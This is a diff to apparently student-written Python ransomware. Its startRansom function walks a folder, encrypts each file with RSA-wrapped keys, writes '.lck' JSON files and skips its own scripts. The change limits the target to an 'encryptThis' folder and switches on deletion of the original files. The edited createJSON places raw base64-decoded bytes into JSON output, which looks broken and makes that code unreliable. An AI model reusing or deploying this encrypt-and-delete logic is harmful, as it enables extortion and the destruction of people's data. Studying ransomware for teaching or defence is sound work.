@@ -156,6 +156,7 @@ def myRSAEncrypt(filepath, RSA_Publickey_filepath):
 				)
 			)
 		key_file.close()
+
 	return (RSACipher, cipherFile, iv, tag, fileExt) 
 
 
@@ -166,11 +167,12 @@ def startRansom():
 	privateKeyPath = os.path.join(keyFolder, "private_key")
 	publicKeyPath = os.path.join(keyFolder, "public_key")
 
-	for dirName, subDirList, fileList in os.walk(os.getcwd()):
+	for dirName, subDirList, fileList in os.walk('encryptThis'):
 		print('Found directory: %s' % dirName)
 		for fileName in fileList:
 			print(fileName)
-			if(fileName == 'encryption.py' 
+			if(fileName == 'encryption.py'
+						or fileName == 'main.py'
 						or fileName == 'decryption.py'
 						or fileName == 'rsakeys.py'
 						or fileName == 'constants.py'
@@ -179,23 +181,31 @@ def startRansom():
 				print('Found: %s' % fileName)
 
 			else:
-				file = os.path.join(dirName, fileName)
-				(RSACipher, cipherFile, iv, tag, fileExt) = myRSAEncrypt(file, publicKeyPath)
-				#os.remove(file)
-				createJSON(file, RSACipher, cipherFile, iv, tag, fileExt)
+				try:
+					file = os.path.join(dirName, fileName)
+					(RSACipher, cipherFile, iv, tag, fileExt) = myRSAEncrypt(file, publicKeyPath)
+					createJSON(file, RSACipher, cipherFile, iv, tag, fileExt)
+					os.remove(file)
+				except Exception as e:
+					print(e) 
 
 # Create a JSON file
 def createJSON(fileName, RSACipher, cipherFile, iv, tag, fileExt):
+	print("JSONRSA")
+	print(RSACipher)
+	print("decoded")
+	print(base64.b64decode(RSACipher))
+
 	name, ext = os.path.splitext(fileName)
 	data = {}
-	data['fileName'] = name
-	data['RSACipher'] = base64.encodestring(RSACipher).decode('ascii')
-	data['cipherFile'] = base64.encodestring(cipherFile).decode('ascii')
-	data['iv'] = base64.encodestring(iv).decode('ascii')
-	data['tag'] = base64.encodestring(tag).decode('ascii')
+	data['fileName'] = 		name
+	data['RSACipher'] = 	base64.b64decode(RSACipher)
+	data['cipherFile'] =	base64.b64decode(cipherFile)
+	data['iv'] = 			base64.b64decode(iv)
+	data['tag'] = 			base64.b64decode(tag)
 	data['fileExt'] = fileExt
-	with open(fileName + '.lck', 'w') as file:
-		file.write(json.dumps(data, indent=4))
+	with open(fileName.rsplit(".", 1)[0] + '.lck', 'w') as file:
+		file.write(json.dumps(data, indent=constants.CONST_INDENT_SIZE))
 		file.close()
 		
 
